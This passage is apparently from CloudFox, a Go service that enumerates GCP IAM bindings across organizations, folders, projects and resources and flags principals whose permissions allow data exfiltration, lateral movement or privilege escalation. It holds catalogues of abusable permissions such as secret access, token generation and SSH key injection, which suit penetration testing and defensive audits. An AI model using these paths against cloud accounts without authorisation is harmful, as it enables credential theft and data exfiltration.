package attackpathservice

import (
	"context"
	"fmt"
	"strings"

	iampb "cloud.google.com/go/iam/apiv1/iampb"
	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	resourcemanagerpb "cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/BishopFox/cloudfox/internal/gcp/sdk"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"

	// Resource-level IAM
	"google.golang.org/api/bigquery/v2"
	"google.golang.org/api/compute/v1"
	"google.golang.org/api/storage/v1"
)

var logger = internal.NewLogger()

// AttackPathService provides analysis for data exfiltration and lateral movement paths
type AttackPathService struct {
	session *gcpinternal.SafeSession
}

func New() *AttackPathService {
	return &AttackPathService{}
}

func NewWithSession(session *gcpinternal.SafeSession) *AttackPathService {
	return &AttackPathService{session: session}
}

// getIAMService returns an IAM service using cached session if available
func (s *AttackPathService) getIAMService(ctx context.Context) (*iam.Service, error) {
	if s.session != nil {
		return sdk.CachedGetIAMService(ctx, s.session)
	}
	return iam.NewService(ctx)
}

// getResourceManagerService returns a Resource Manager service using cached session if available
func (s *AttackPathService) getResourceManagerService(ctx context.Context) (*crmv1.Service, error) {
	if s.session != nil {
		return sdk.CachedGetResourceManagerService(ctx, s.session)
	}
	return crmv1.NewService(ctx)
}

// getStorageService returns a Storage service using cached session if available
func (s *AttackPathService) getStorageService(ctx context.Context) (*storage.Service, error) {
	if s.session != nil {
		return sdk.CachedGetStorageService(ctx, s.session)
	}
	return storage.NewService(ctx)
}

// getBigQueryService returns a BigQuery service using cached session if available
func (s *AttackPathService) getBigQueryService(ctx context.Context) (*bigquery.Service, error) {
	if s.session != nil {
		return sdk.CachedGetBigQueryService(ctx, s.session)
	}
	return bigquery.NewService(ctx)
}

// getComputeService returns a Compute service using cached session if available
func (s *AttackPathService) getComputeService(ctx context.Context) (*compute.Service, error) {
	if s.session != nil {
		return sdk.CachedGetComputeService(ctx, s.session)
	}
	return compute.NewService(ctx)
}

// DataExfilPermission represents a permission that enables data exfiltration
type DataExfilPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// LateralMovementPermission represents a permission that enables lateral movement
type LateralMovementPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// PrivescPermission represents a permission that enables privilege escalation
type PrivescPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// AttackPath represents an attack path (exfil, lateral, or privesc)
type AttackPath struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"`
	Method         string   `json:"method"`
	TargetResource string   `json:"targetResource"`
	Permissions    []string `json:"permissions"`
	Category       string   `json:"category"`
	RiskLevel      string   `json:"riskLevel"`
	Description    string   `json:"description"`
	ExploitCommand string   `json:"exploitCommand"`
	ProjectID      string   `json:"projectId"`
	ScopeType      string   `json:"scopeType"` // organization, folder, project, resource
	ScopeID        string   `json:"scopeId"`
	ScopeName      string   `json:"scopeName"`
	PathType       string   `json:"pathType"` // "exfil", "lateral", or "privesc"
}

// CombinedAttackPathData holds all attack paths across org/folder/project/resource levels
type CombinedAttackPathData struct {
	OrgPaths      []AttackPath          `json:"orgPaths"`
	FolderPaths   []AttackPath          `json:"folderPaths"`
	ProjectPaths  []AttackPath          `json:"projectPaths"`
	ResourcePaths []AttackPath          `json:"resourcePaths"`
	AllPaths      []AttackPath          `json:"allPaths"`
	OrgNames      map[string]string     `json:"orgNames"`
	FolderNames   map[string]string     `json:"folderNames"`
	OrgIDs        []string              `json:"orgIds"`
}

// GetDataExfilPermissions returns permissions that enable data exfiltration
func GetDataExfilPermissions() []DataExfilPermission {
	return []DataExfilPermission{
		// Compute Exports
		{Permission: "compute.images.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create VM images from disks for external export"},
		{Permission: "compute.snapshots.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create disk snapshots for external export"},
		{Permission: "compute.disks.createSnapshot", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create snapshots from specific disks"},
		{Permission: "compute.machineImages.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create machine images including disk data"},

		// Logging Sinks
		{Permission: "logging.sinks.create", Category: "Logging", RiskLevel: "HIGH", Description: "Create logging sinks to export logs externally"},
		{Permission: "logging.sinks.update", Category: "Logging", RiskLevel: "HIGH", Description: "Modify logging sinks to redirect to external destinations"},

		// Cloud SQL
		{Permission: "cloudsql.backups.create", Category: "Database", RiskLevel: "HIGH", Description: "Create Cloud SQL backups for export"},
		{Permission: "cloudsql.instances.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Cloud SQL data to GCS"},

		// Pub/Sub
		{Permission: "pubsub.subscriptions.create", Category: "Messaging", RiskLevel: "HIGH", Description: "Create subscriptions to intercept messages"},
		{Permission: "pubsub.subscriptions.consume", Category: "Messaging", RiskLevel: "MEDIUM", Description: "Pull messages from subscriptions"},
		{Permission: "pubsub.subscriptions.update", Category: "Messaging", RiskLevel: "HIGH", Description: "Modify subscription push endpoints"},

		// BigQuery
		{Permission: "bigquery.tables.export", Category: "BigQuery", RiskLevel: "CRITICAL", Description: "Export BigQuery tables to GCS"},
		{Permission: "bigquery.tables.getData", Category: "BigQuery", RiskLevel: "HIGH", Description: "Read data from BigQuery tables"},
		{Permission: "bigquery.jobs.create", Category: "BigQuery", RiskLevel: "MEDIUM", Description: "Run queries and extract data"},

		// Storage
		{Permission: "storage.objects.get", Category: "Storage", RiskLevel: "HIGH", Description: "Download objects from GCS buckets"},
		{Permission: "storage.objects.list", Category: "Storage", RiskLevel: "MEDIUM", Description: "List objects to identify sensitive data"},

		// Storage Transfer
		{Permission: "storagetransfer.jobs.create", Category: "Storage Transfer", RiskLevel: "CRITICAL", Description: "Create transfer jobs to external clouds"},
		{Permission: "storagetransfer.jobs.update", Category: "Storage Transfer", RiskLevel: "HIGH", Description: "Modify transfer jobs to external destinations"},

		// Spanner
		{Permission: "spanner.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Spanner databases to GCS"},
		{Permission: "spanner.databases.read", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Spanner databases"},

		// Firestore/Datastore
		{Permission: "datastore.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Firestore/Datastore data to GCS"},
		{Permission: "datastore.entities.get", Category: "Database", RiskLevel: "HIGH", Description: "Read Firestore/Datastore entities"},

		// Bigtable
		{Permission: "bigtable.tables.readRows", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Bigtable tables"},

		// Secrets
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "CRITICAL", Description: "Access secret values (API keys, credentials)"},

		// KMS
		{Permission: "cloudkms.cryptoKeyVersions.useToDecrypt", Category: "Encryption", RiskLevel: "HIGH", Description: "Decrypt encrypted data for exfiltration"},
	}
}

// GetLateralMovementPermissions returns permissions that enable lateral movement
func GetLateralMovementPermissions() []LateralMovementPermission {
	return []LateralMovementPermission{
		// VPC Peering
		{Permission: "compute.networks.addPeering", Category: "Network", RiskLevel: "CRITICAL", Description: "Create VPC peering to access resources in other projects"},
		{Permission: "compute.networks.updatePeering", Category: "Network", RiskLevel: "HIGH", Description: "Modify VPC peering configurations"},
		{Permission: "compute.networks.removePeering", Category: "Network", RiskLevel: "MEDIUM", Description: "Remove VPC peering (disruptive)"},

		// Service Networking
		{Permission: "servicenetworking.services.addPeering", Category: "Network", RiskLevel: "HIGH", Description: "Enable private service access to shared networks"},

		// Shared VPC
		{Permission: "compute.subnetworks.use", Category: "Shared VPC", RiskLevel: "HIGH", Description: "Use shared VPC subnets in other projects"},
		{Permission: "compute.subnetworks.setPrivateIpGoogleAccess", Category: "Shared VPC", RiskLevel: "MEDIUM", Description: "Modify private Google access settings"},

		// Image/Snapshot IAM
		{Permission: "compute.images.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
		{Permission: "compute.machineImages.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share machine images with external projects"},

		// SA Impersonation
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate tokens for SAs in other projects"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign as SAs in other projects"},

		// GKE
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get credentials for GKE clusters"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Execute commands in pods"},
		{Permission: "container.pods.portForward", Category: "GKE", RiskLevel: "HIGH", Description: "Port forward to pods"},

		// Compute Access
		{Permission: "compute.instances.osLogin", Category: "Compute Access", RiskLevel: "HIGH", Description: "SSH into instances via OS Login"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "SSH with sudo via OS Login"},
		{Permission: "compute.instances.setMetadata", Category: "Compute Access", RiskLevel: "HIGH", Description: "Add SSH keys via metadata"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "Add SSH keys project-wide"},

		// Cloud SQL
		{Permission: "cloudsql.instances.connect", Category: "Database Access", RiskLevel: "HIGH", Description: "Connect to Cloud SQL instances"},
		{Permission: "cloudsql.users.create", Category: "Database Access", RiskLevel: "HIGH", Description: "Create database users"},

		// VPN/Interconnect
		{Permission: "compute.vpnTunnels.create", Category: "Network", RiskLevel: "HIGH", Description: "Create VPN tunnels to external networks"},
		{Permission: "compute.interconnects.create", Category: "Network", RiskLevel: "CRITICAL", Description: "Create dedicated interconnects"},
		{Permission: "compute.routers.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Router for traffic redirection"},

		// Firewall
		{Permission: "compute.firewalls.create", Category: "Network", RiskLevel: "HIGH", Description: "Create firewall rules to allow access"},
		{Permission: "compute.firewalls.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify firewall rules to allow access"},
		{Permission: "compute.securityPolicies.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Armor policies"},

		// IAP
		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
		{Permission: "iap.tunnelDestGroups.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access resources via IAP tunnel"},
	}
}

// GetPrivescPermissions returns permissions that enable privilege escalation
func GetPrivescPermissions() []PrivescPermission {
	return []PrivescPermission{
		// Service Account Impersonation - CRITICAL
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA (GCS signed URLs)"},
		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA (impersonation)"},
		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Delegate SA identity to others"},
		{Permission: "iam.serviceAccounts.getOpenIdToken", Category: "SA Impersonation", RiskLevel: "HIGH", Description: "Generate OIDC tokens for SA"},

		// Key Creation - CRITICAL
		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys"},
		{Permission: "storage.hmacKeys.create", Category: "Key Creation", RiskLevel: "HIGH", Description: "Create HMAC keys for S3-compatible access"},

		// IAM Modification - CRITICAL
		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project-level IAM policy"},
		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder-level IAM policy"},
		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org-level IAM policy"},
		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant access to service accounts"},
		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify custom role permissions"},
		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create new custom roles"},

		// Resource-specific IAM Modification - HIGH
		{Permission: "pubsub.topics.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Pub/Sub topic IAM policy"},
		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Pub/Sub subscription IAM policy"},
		{Permission: "bigquery.datasets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify BigQuery dataset IAM policy"},
		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Artifact Registry IAM policy"},
		{Permission: "compute.instances.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Compute instance IAM policy"},

		// Compute Access - HIGH
		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create compute instances with SA"},
		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify instance metadata (SSH keys, startup scripts)"},
		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance service account"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify project-wide metadata"},
		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH into instances via OS Login"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute", RiskLevel: "HIGH", Description: "SSH with sudo via OS Login"},

		// Cloud Functions - HIGH
		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA identity"},
		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code/SA"},
		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Change function source code"},
		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function IAM policy (make public)"},

		// Cloud Run - HIGH
		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA identity"},
		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service code/SA"},
		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service IAM policy (make public)"},
		{Permission: "run.jobs.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Create Cloud Run jobs with SA identity"},
		{Permission: "run.jobs.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify Cloud Run job code/SA"},

		// Data Processing - HIGH
		{Permission: "dataproc.clusters.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataproc clusters with SA identity"},
		{Permission: "dataproc.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Submit jobs to Dataproc clusters"},
		{Permission: "dataflow.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataflow jobs with SA identity"},

		// Cloud Composer - CRITICAL
		{Permission: "composer.environments.create", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Create Composer environments with SA identity"},
		{Permission: "composer.environments.update", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Modify Composer environment configuration"},

		// Cloud Build - CRITICAL
		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA"},

		// GKE - HIGH
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get GKE cluster credentials"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods"},
		{Permission: "container.secrets.get", Category: "GKE", RiskLevel: "HIGH", Description: "Read Kubernetes secrets"},

		// Secrets - HIGH
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values"},
		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets", RiskLevel: "HIGH", Description: "Grant access to secrets"},

		// Deployment Manager - CRITICAL
		{Permission: "deploymentmanager.deployments.create", Category: "Deployment", RiskLevel: "CRITICAL", Description: "Deploy arbitrary infrastructure with DM SA"},

		// Workload Identity Federation - CRITICAL
		{Permission: "iam.workloadIdentityPools.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create workload identity pools for external access"},
		{Permission: "iam.workloadIdentityPoolProviders.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create identity providers for external impersonation"},

		// Org Policies - CRITICAL
		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable organization policy constraints"},

		// SA Usage
		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation"},
	}
}

// AnalyzeOrganizationAttackPaths analyzes org-level IAM for attack paths
func (s *AttackPathService) AnalyzeOrganizationAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, []string, error) {
	var paths []AttackPath
	orgNames := make(map[string]string)
	var orgIDs []string

	// Create organizations client
	var orgsClient *resourcemanager.OrganizationsClient
	var err error
	if s.session != nil {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx, s.session.GetClientOption())
	} else {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx)
	}
	if err != nil {
		return nil, orgNames, orgIDs, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer orgsClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for organizations
	searchReq := &resourcemanagerpb.SearchOrganizationsRequest{}
	it := orgsClient.SearchOrganizations(ctx, searchReq)
	for {
		org, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		orgID := strings.TrimPrefix(org.Name, "organizations/")
		orgNames[orgID] = org.DisplayName
		orgIDs = append(orgIDs, orgID)

		// Get IAM policy for this organization
		policy, err := orgsClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: org.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"organization", orgID, org.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, orgNames, orgIDs, nil
}

// AnalyzeFolderAttackPaths analyzes folder-level IAM for attack paths
func (s *AttackPathService) AnalyzeFolderAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, error) {
	var paths []AttackPath
	folderNames := make(map[string]string)

	// Create folders client
	var foldersClient *resourcemanager.FoldersClient
	var err error
	if s.session != nil {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx, s.session.GetClientOption())
	} else {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx)
	}
	if err != nil {
		return nil, folderNames, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer foldersClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for folders
	searchReq := &resourcemanagerpb.SearchFoldersRequest{}
	it := foldersClient.SearchFolders(ctx, searchReq)
	for {
		folder, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		folderID := strings.TrimPrefix(folder.Name, "folders/")
		folderNames[folderID] = folder.DisplayName

		// Get IAM policy for this folder
		policy, err := foldersClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: folder.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"folder", folderID, folder.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, folderNames, nil
}

// AnalyzeProjectAttackPaths analyzes project-level IAM for attack paths
func (s *AttackPathService) AnalyzeProjectAttackPaths(ctx context.Context, projectID, projectName, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get project IAM policy
	crmService, err := s.getResourceManagerService(ctx)
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	policy, err := crmService.Projects.GetIamPolicy(projectID, &crmv1.GetIamPolicyRequest{}).Do()
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Analyze each binding
	for _, binding := range policy.Bindings {
		if binding == nil {
			continue
		}

		permissions := s.getRolePermissions(iamService, binding.Role, projectID)
		for _, member := range binding.Members {
			memberPaths := s.analyzePermissionsForAttackPaths(
				member, binding.Role, permissions, projectID,
				"project", projectID, projectName,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths, nil
}

// AnalyzeResourceAttackPaths analyzes resource-level IAM for attack paths
func (s *AttackPathService) AnalyzeResourceAttackPaths(ctx context.Context, projectID, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Analyze GCS bucket IAM policies
	bucketPaths := s.analyzeBucketIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bucketPaths...)

	// Analyze BigQuery dataset IAM policies
	bqPaths := s.analyzeBigQueryIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bqPaths...)

	// Analyze Service Account IAM policies
	saPaths := s.analyzeServiceAccountIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, saPaths...)

	// Analyze Compute resource IAM (images, snapshots)
	computePaths := s.analyzeComputeResourceIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, computePaths...)

	return paths, nil
}

// analyzeBucketIAM analyzes IAM policies on GCS buckets
func (s *AttackPathService) analyzeBucketIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	storageService, err := s.getStorageService(ctx)
	if err != nil {
		return paths
	}

	// List buckets in the project
	buckets, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, bucket := range buckets.Items {
		// Get IAM policy for this bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", fmt.Sprintf("gs://%s", bucket.Name), bucket.Name,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeBigQueryIAM analyzes IAM policies on BigQuery datasets
func (s *AttackPathService) analyzeBigQueryIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	bqService, err := s.getBigQueryService(ctx)
	if err != nil {
		return paths
	}

	// List datasets in the project
	datasets, err := bqService.Datasets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, dataset := range datasets.Datasets {
		datasetID := dataset.DatasetReference.DatasetId

		// Get dataset to access IAM policy
		ds, err := bqService.Datasets.Get(projectID, datasetID).Do()
		if err != nil {
			continue
		}

		// BigQuery uses Access entries instead of standard IAM bindings
		for _, access := range ds.Access {
			member := ""
			if access.UserByEmail != "" {
				member = "user:" + access.UserByEmail
			} else if access.GroupByEmail != "" {
				member = "group:" + access.GroupByEmail
			} else if access.SpecialGroup != "" {
				member = access.SpecialGroup
			} else if access.IamMember != "" {
				member = access.IamMember
			}

			if member == "" {
				continue
			}

			role := access.Role
			permissions := s.getRolePermissions(iamService, "roles/bigquery."+strings.ToLower(role), projectID)

			memberPaths := s.analyzePermissionsForAttackPaths(
				member, role, permissions, projectID,
				"resource", fmt.Sprintf("%s:%s", projectID, datasetID), datasetID,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths
}

// analyzeServiceAccountIAM analyzes IAM policies on service accounts
func (s *AttackPathService) analyzeServiceAccountIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	if iamService == nil {
		var err error
		iamService, err = s.getIAMService(ctx)
		if err != nil {
			return paths
		}
	}

	// List service accounts in the project
	saList, err := iamService.Projects.ServiceAccounts.List("projects/" + projectID).Do()
	if err != nil {
		return paths
	}

	for _, sa := range saList.Accounts {
		// Get IAM policy for this service account
		policy, err := iamService.Projects.ServiceAccounts.GetIamPolicy("projects/" + projectID + "/serviceAccounts/" + sa.Email).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", sa.Email, sa.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeComputeResourceIAM analyzes IAM policies on compute resources (images, snapshots)
func (s *AttackPathService) analyzeComputeResourceIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	computeService, err := s.getComputeService(ctx)
	if err != nil {
		return paths
	}

	// Analyze images
	images, err := computeService.Images.List(projectID).Do()
	if err == nil {
		for _, image := range images.Items {
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("image/%s", image.Name), image.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	// Analyze snapshots
	snapshots, err := computeService.Snapshots.List(projectID).Do()
	if err == nil {
		for _, snapshot := range snapshots.Items {
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("snapshot/%s", snapshot.Name), snapshot.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// CombinedAttackPathAnalysis performs attack path analysis across all scopes
func (s *AttackPathService) CombinedAttackPathAnalysis(ctx context.Context, projectIDs []string, projectNames map[string]string, pathType string) (*CombinedAttackPathData, error) {
	result := &CombinedAttackPathData{
		OrgPaths:      []AttackPath{},
		FolderPaths:   []AttackPath{},
		ProjectPaths:  []AttackPath{},
		ResourcePaths: []AttackPath{},
		AllPaths:      []AttackPath{},
		OrgNames:      make(map[string]string),
		FolderNames:   make(map[string]string),
		OrgIDs:        []string{},
	}

	// Analyze organization-level IAM
	orgPaths, orgNames, orgIDs, err := s.AnalyzeOrganizationAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization attack paths")
